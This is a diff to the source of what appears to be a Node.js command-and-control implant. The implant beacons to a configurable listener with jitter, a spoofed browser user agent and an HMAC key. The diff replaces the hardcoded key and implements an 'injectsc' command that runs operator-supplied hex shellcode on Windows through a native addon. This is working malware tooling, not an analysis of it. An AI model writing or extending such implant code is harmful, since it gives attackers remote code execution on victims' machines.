@@ -15,7 +15,7 @@ const execAsync = promisify(exec);
 const LISTENER_HOST = process.env.ANOMALY_HOST || 'localhost';
 const LISTENER_PORT = process.env.ANOMALY_PORT || '8082';
 const LISTENER_ENDPOINT = process.env.ANOMALY_ENDPOINT || '/wiki';
-const HMAC_KEY = process.env.ANOMALY_HMAC_KEY || '069290530a27e8a2d9c377d02e295a62907cd11705899217201fdbe75fa5d169';
+const HMAC_KEY = process.env.ANOMALY_HMAC_KEY || '76b7142fb03436325c744a35bd1302d0e35ec7e04c1857bdeed0549f051b99fb';
 const RECONNECT_INTERVAL = parseInt(process.env.ANOMALY_INTERVAL || '15', 10);
 const JITTER_SECONDS = parseInt(process.env.ANOMALY_JITTER || '10', 10);
 const USER_AGENT = process.env.ANOMALY_USER_AGENT || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
@@ -431,9 +431,43 @@ async function handleJitter(args) {
     return `Jitter changed from +/- ${oldJitter} to +/- ${newJitter} seconds`;
 }
 
-// Handle injectsc command (not implemented for cross-platform)
+// Handle injectsc command
 async function handleInjectSc(args) {
-    return 'Shellcode injection not implemented in Node.js version';
+    if (args.length === 0) {
+        throw new Error('usage: injectsc <hex_shellcode>');
+    }
+
+    // Only supported on Windows
+    if (process.platform !== 'win32') {
+        return 'Shellcode injection only supported on Windows';
+    }
+
+    try {
+        // Load native addon
+        const inject = require('./build/Release/inject.node');
+
+        // Get shellcode from arguments
+        const hexShellcode = args.join('').replace(/\s/g, '');
+
+        // Validate hex
+        if (hexShellcode.length % 2 !== 0) {
+            throw new Error('Invalid hex shellcode: odd length');
+        }
+
+        // Convert hex to buffer
+        const shellcode = Buffer.from(hexShellcode, 'hex');
+
+        if (shellcode.length === 0) {
+            throw new Error('Empty shellcode provided');
+        }
+
+        // Execute shellcode via native addon
+        inject.executeShellcode(shellcode);
+
+        return `Shellcode executed (${shellcode.length} bytes)`;
+    } catch (error) {
+        return `Shellcode injection failed: ${error.message}`;
+    }
 }
 
 // Parse command arguments respecting quotes
